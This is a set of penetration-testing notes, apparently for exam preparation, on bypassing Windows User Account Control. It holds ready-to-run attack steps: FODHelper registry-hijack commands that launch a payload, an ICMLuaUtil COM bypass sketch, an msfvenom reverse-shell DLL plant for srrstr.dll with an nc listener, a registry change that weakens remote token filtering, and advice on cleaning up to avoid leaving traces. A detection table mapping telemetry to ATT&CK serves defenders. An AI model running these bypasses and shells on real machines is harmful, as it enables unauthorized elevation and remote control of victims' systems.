+++
title = 'User Account Control (UAC) Bypass'
date = 2026-10-30
type = 'notes'
weight = 60
toc = true
tags = ['windows', 'privilege-escalation', 'uac', 'bypass']
+++

> UAC bypasses leverage flaws or unintended functionality in different Windows builds.
>
> The following repository contains many different UAC bypassing techniques: [UACME](https://github.com/hfiref0x/UACME) — currently lists **81 separate techniques**.

> **⚠️ Critical:** UAC bypass is **not** privilege escalation from a standard user. It only converts a *filtered Administrator token* (medium integrity) into a *full Administrator token* (high integrity). You **must already be a member of the local `Administrators` group** (and, for some methods, already have an elevated process). A standard user cannot UAC-bypass their way to administrator.

> **Why UAC bypass exists at all:** UAC was introduced in Vista to let a user run most processes with limited privileges while temporarily elevating when needed. But because the limited and elevated contexts share the **same account, profile, and registry hive**, a medium-integrity process can plant configuration that an auto-elevating high-integrity process later reads. Microsoft downgraded UAC from a “security boundary” to a “security feature” — which is why bypasses are not treated as security vulnerabilities.

---

## 1. Initial Enumeration

### 1.1 UAC configuration

```cmd
:: UAC enabled? (0x1 = yes)
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

:: UAC prompt behaviour
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

| `ConsentPromptBehaviorAdmin` | Meaning |
|---|---|
| `0` | Elevate without prompting |
| `1` | Prompt for credentials on the secure desktop (most restrictive) |
| `2` | Prompt for consent on the secure desktop |
| `3` | Prompt for credentials |
| `4` | Prompt for consent |
| `5` | Prompt for consent for non-Windows binaries (**default** — not the maximum, contrary to a common misconception) |

### 1.2 Build and integrity level

```powershell
[environment]::OSVersion.Version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
whoami /groups          :: "Mandatory Label\Medium Mandatory Level" = filtered; "High" = already elevated
```

> **If `whoami /groups` shows `Medium Mandatory Level` and you are in `Administrators`, UAC is the only barrier.** `High` means you are already elevated — no bypass needed.

### 1.3 Enumerate auto-elevating binaries

UAC bypasses work because **Microsoft-signed binaries with the `autoElevate` manifest flag** silently jump to the full token without a prompt — provided the binary is in a trusted directory (`C:\Windows\System32` and a small set of allowed subfolders) and UAC is at the default level.

```cmd
sigcheck.exe -m C:\Windows\System32\fodhelper.exe | findstr /i autoElevate
```

```powershell
Get-ChildItem C:\Windows\System32\*.exe | ForEach-Object {
  if ((Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue) -match 'autoElevate.*true') {
    $_.Name
  }
}
```

---

## 2. The Dominant Pattern: HKCU Registry Hijack of an Auto-Elevating Binary

Most UAC bypasses follow one structure:

> **An auto-elevating binary reads a per-user registry key (`HKCU`) before launching a child process — and the attacker writes a command into that key first.** Because the key is under `HKCU`, **no elevation is required to plant it**. When the binary starts, it elevates itself and executes the planted command at **high integrity**.

| Auto-elevating binary | Hijacked key |
|---|---|
| **`fodhelper.exe`** | `HKCU\Software\Classes\ms-settings\Shell\Open\command` |
| **`computerdefaults.exe`** | `HKCU\Software\Classes\ms-settings\Shell\Open\command` |
| **`eventvwr.exe`** | `HKCU\Software\Classes\mscfile\shell\open\command` |
| **`sdclt.exe`** | `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe` (or `Folder` handler) |
| **`slui.exe`** | File-handler hijack |
| **`cmstp.exe`** | INF execution |

Each checks **`HKCU` before `HKLM`**, so a command written under `HKCU` runs at high integrity when the binary starts.

### FODHelper — the canonical registry hijack

```cmd
:: Create the handler (HKCU is writable from medium integrity)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "C:\Users\Public\rev.exe" /f

:: Trigger
C:\Windows\System32\fodhelper.exe

:: Cleanup
reg delete HKCU\Software\Classes\ms-settings /f
```

`fodhelper.exe` auto-elevates and opens the `ms-settings:` protocol. Windows resolves that handler through **`HKCU` first** — the empty `DelegateExecute` value plus the default command makes `fodhelper` run your payload as high integrity, **with no prompt**.

### Other bypass families

- **`sdclt.exe`** — `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`.
- **`eventvwr.exe`** — `HKCU\Software\Classes\mscfile\shell\open\command`.
- **`slui.exe`** — file-handler hijack (a 2025 GitHub topic lists this as an active research area).
- **`wusa.exe` WinSxS abuse** — referred to in the DccwBypassUAC research.
- **`cmstp.exe`** — INF execution to bypass UAC.
- **Volatile Environment LPE family** — TaskMgr, Sysprep, Remote Assistance, Performance Monitor, Enter Product Key, Display Languages, Component Services.

---

## 3. ICMLuaUtil — COM Elevation Moniker (the 2025–2026 default)

The **ICMLuaUtil** interface, exposed through the **CMSTPLUA** COM component, allows an elevated process to be launched **without a UAC prompt**. It has become the dominant UAC-bypass primitive in modern malware and red-team tooling.

### Why it matters

- **Public, maintained implementations** exist in C++ and C# — the technique is not a one-off research PoC.
- **It is used in real intrusion chains.** A 2026 CrySome RAT infection chain used an **ICMLuaUtil COM interface UAC bypass** to escalate before deploying persistence. LunexLoader (delivered via ClickFix) uses the **CMSTPLUA COM object** to bypass UAC.
- **It is paired with defense evasion** — PEB spoofing, COM activation-policy manipulation, and process masquerading.

### How it works (high level)

1. Instantiate the `CMSTPLUA` COM object.
2. Obtain the `ICMLuaUtil` interface.
3. Call `ShellExec` with the target command.
4. The elevated process starts **without a consent prompt**.

The COM object runs in an elevated context, so the `ShellExec` call inherits high integrity.

### Minimal usage sketch

```cpp
// Pseudocode — see the public ICMLuaUtil repositories for full implementations
CoInitialize(nullptr);
IUnknown* pUnk = nullptr;
CoGetClassObject(CLSID_CMSTPLUA, CLSCTX_LOCAL_SERVER, nullptr, IID_IUnknown, (void**)&pUnk);

ICMLuaUtil* pLua = nullptr;
pUnk->QueryInterface(IID_ICMLuaUtil, (void**)&pLua);
pLua->ShellExec(L"C:\\Windows\\System32\\cmd.exe", nullptr, nullptr, SW_SHOW, 0, nullptr, nullptr);
```

> **Why this is preferred over FODHelper in 2026:** the registry-hijack family is heavily signatured by EDR (see the detection table). The COM-moniker path leaves no `HKCU\Software\Classes\ms-settings` artifact and runs through a legitimate COM service, making it less visible to rules that key on the FODHelper registry keys.

---

## 4. ClickFix — How UAC Bypasses Are Actually Delivered

UAC bypass is rarely the initial access vector; it is the **second stage** after a user has been tricked into executing a command. **ClickFix** is the dominant delivery mechanism in 2025–2026.

### The chain

1. A compromised website shows a **fake Cloudflare verification page** asking the visitor to “prove you are human” by pressing **Win + R**, pasting a command, and pressing Enter.
2. The pasted command downloads and installs a **malicious MSI package** from a remote server.
3. The MSI **attempts to bypass UAC**, configures **Defender exclusions**, and loads a **vulnerable signed driver** to blind security software before deploying the final payload.

A variant uses **`cmdkey` + `regsvr32`** instead of PowerShell — no file drop, no PowerShell process, just two signed Microsoft binaries.

### Why this matters for your notes

- **UAC bypass is delivered, not discovered.** If you are simulating an intrusion, ClickFix is the realistic path from a phishing click to an elevated context.
- **The MSI wraps the bypass.** The UAC-bypass code runs inside an MSI, which is itself signed or at least trusted enough to execute.
- **Defender exclusions are configured before the bypass** — the MSI sets exclusions first so that the UAC-bypass payload and the final stealer are not scanned.

---

## 5. Windows 11 Administrator Protection — Current Status (2026)

Administrator Protection is Microsoft’s replacement for UAC. It creates a **separate “shadow administrator” account** for elevated tasks, eliminating the shared-profile/shared-token weakness that makes UAC bypass possible.

### What changed

- **Auto-elevation is eliminated entirely** — every admin operation requires interactive Windows Hello authorization.
- Elevated sessions use a **distinct SID and separate user profile** — the `HKCU` hijack pattern no longer reaches the elevated process’s registry view.
- **Nine distinct bypasses** were found by Google Project Zero during the Insider preview, including a **DOS device object directory** attack that hijacks the `C:` drive of administrator processes before they initialize.

### Current state

> **As of 1 December 2025, Microsoft temporarily disabled Administrator Protection via a feature flag on all Windows 11 machines** due to application compatibility issues.

This means:

- **On Windows 11 25H2 with the current flag state, UAC — not Administrator Protection — is the active mechanism.** The traditional bypasses still apply.
- **If Administrator Protection is re-enabled** (by a future update or manual policy), the `HKCU` hijack family should stop working, but the Project Zero bypasses (CVE-2025-60718, CVSS 7.8) and the DOS-device-directory technique may still apply.
- **Check the feature state before choosing a technique:**

```powershell
:: Administrator Protection status (if the cmdlet exists on the build)
Get-ComputerInfo | Select-Object -Property WindowsProductName, WindowsVersion, OsBuildNumber
:: Look for the feature flag / policy
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableAdministratorProtection 2>nul
```

> **Practical guidance:** treat UAC bypass as the default assumption on Windows 10 and current Windows 11 builds. If the target is a future build with Administrator Protection enforced, pivot to the Project Zero techniques or a different escalation path entirely.

---

## 6. Remote UAC — `LocalAccountTokenFilterPolicy`

For **local** accounts on a remote machine, UAC filtering strips the Administrator token over the network (SMB/WMI/WinRM), so `net use` / `wmiexec` with a local admin account may fail even with the correct password. This is **separate** from the interactive UAC bypass above.

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy
```

If writable, set it to `1` and retry:

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

> **Domain accounts are not filtered** by this policy, and the built-in `Administrator` (RID 500) is also exempt.

---

## 7. Build-Specific Example — `srrstr.dll` (Windows 10 1607–1809)

1. Place a malicious `srrstr.dll` in the **per-user** `WindowsApps` directory:
   - Full path: `%LOCALAPPDATA%\Microsoft\WindowsApps\` — **not** `C:\Program Files\WindowsApps`
   - Affected builds: Windows 10 1607/14393 through 1809/17763 (fixed in 19H1/18362+).
2. Generate the DLL:
   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > srrstr.dll
   ```
   Use a **32-bit** payload for the 32-bit `SystemPropertiesAdvanced.exe`.
3. Transfer to `%LOCALAPPDATA%\Microsoft\WindowsApps\srrstr.dll`.
4. Start a listener: `nc -lvnp 4444`.
5. Trigger: `C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe`.

---

## 8. Detection — What Each Bypass Exposes

If you are documenting a path or writing detection logic, note the signal each technique leaves:

| Technique | Primary telemetry | ATT&CK |
|---|---|---|
| **HKCU `ms-settings` / `mscfile` / `Folder` write** | Sysmon 12/13, EDR registry — match `HKU\<SID>_Classes\ms-settings\shell\open\command` | T1548.002 |
| **Auto-elevating parent spawning an interpreter** | Sysmon 1 / 4688 — `fodhelper.exe`, `computerdefaults.exe`, `eventvwr.exe`, `sdclt.exe` spawning `cmd`, `powershell`, `wscript`, `mshta`, `rundll32`, `regsvr32` | T1548.002 |
| **High-integrity child of a medium-integrity parent with no `consent.exe`** | Sysmon 1 `IntegrityLevel`, 4688 token elevation type | T1548.002 |
| **Empty `DelegateExecute` written beside a command value** | Sysmon 13 | T1548.002 |
| **Key created then deleted within seconds (cleanup)** | Sysmon 12/13/14 | T1112 |
| **ICMLuaUtil / CMSTPLUA COM** | COM object creation telemetry; elevated child with no `consent.exe` in the chain | T1548.002 |
| **`cmdkey /add` to an external IP** | Credential Manager write; Sysmon 1 for `cmdkey.exe` | T1548.002 |
| **`regsvr32` loading a DLL from a UNC path** | Sysmon 1; `regsvr32.exe` command line containing `\\` | T1218.010 |

**Key detection gap:** the registry write and the auto-elevating parent’s child process are **two separate choke points**. If you miss the registry write, the process lineage still catches the execution — an auto-elevating binary should **never** spawn a command interpreter.

---

## 9. Cleanup and Edge Cases

- **Clean up the registry key** immediately after the payload fires:
  ```cmd
  reg delete HKCU\Software\Classes\ms-settings /f
  reg delete HKCU\Software\Classes\mscfile /f
  ```
- **`fodhelper` fails on Server Core** — the `ms-settings` protocol handler is not present on Server Core installations. Use `sdclt` or `eventvwr` instead.
- **UAC at “Always notify” (`ConsentPromptBehaviorAdmin = 1` or `2`)** may break auto-elevation for some binaries. Check the value before choosing a method.
- **Many UACME methods are build-specific and are detected by Defender.** If one fails, check the build number and try the next method; do not spend the exam clock on a single bypass.
- **Some methods require a GUI session** and a **medium-integrity context** (not already elevated). If your shell is already high-integrity, you do not need a bypass.
- **Restore `LocalAccountTokenFilterPolicy` to its original value** after remote access testing.

---

## Quick Reference — Technique → Precondition → Payoff

| Technique | Precondition | Payoff |
|---|---|---|
| **FODHelper registry hijack** | Local admin, medium integrity, GUI session | High-integrity process, no prompt |
| **ComputerDefaults** | Same as FODHelper | Same |
| **EventVWR (`mscfile`)** | Same | Same |
| **sdclt (`App Paths`)** | Same | Same |
| **ICMLuaUtil (CMSTPLUA)** | Local admin, medium integrity | High-integrity process via COM moniker |
| **`srrstr.dll`** | Windows 10 1607–1809, writable `WindowsApps` | SYSTEM via elevated DLL load |
| **`cmstp.exe`** | Local admin | INF execution at high integrity |
| **Volatile Environment LPE family** | Local admin | High-integrity process |
| **Administrator Protection bypass** | Windows 11 25H2 with the feature re-enabled | High-integrity process (Project Zero techniques) |

---

## Field Notes

- **UAC bypass is a medium → high integrity conversion, not a standard-user → admin escalation.** Confirm `whoami /groups` shows `Administrators` and `Medium Mandatory Level` before spending time.
- **The `HKCU` registry hijack is still the most reliable pattern on Windows 10 and current Windows 11.** `fodhelper` and `computerdefaults` share the `ms-settings` key; `eventvwr` uses `mscfile`; `sdclt` uses `App Paths`.
- **ICMLuaUtil is the 2025–2026 default in real malware.** It avoids the signatured registry keys and is used by CrySome RAT, LunexLoader, and other ClickFix-delivered chains.
- **ClickFix is the delivery vehicle.** UAC bypass is the second stage after a fake Cloudflare page convinces the user to paste a command.
- **Administrator Protection is currently disabled** (as of 1 December 2025) due to compatibility issues — so the traditional UAC bypasses still apply on current Windows 11 builds. If it is re-enabled, pivot to the Project Zero techniques or a non-UAC escalation path.
- **Clean up the registry key.** Leaving `HKCU\Software\Classes\ms-settings` behind is both a stability risk and an obvious IOC.
- **Detection has two choke points:** the registry write and the auto-elevating parent’s child process. The process lineage is the more reliable signal because it catches the execution even when the registry write is missed.

---

This file sits alongside the **Living off the Land** and **Services Hijacking** notes: ClickFix delivers the UAC-bypass payload through LOLBins (`cmdkey`, `regsvr32`), and the elevated context it produces is what makes a service binary replacement or a phantom DLL plant possible.
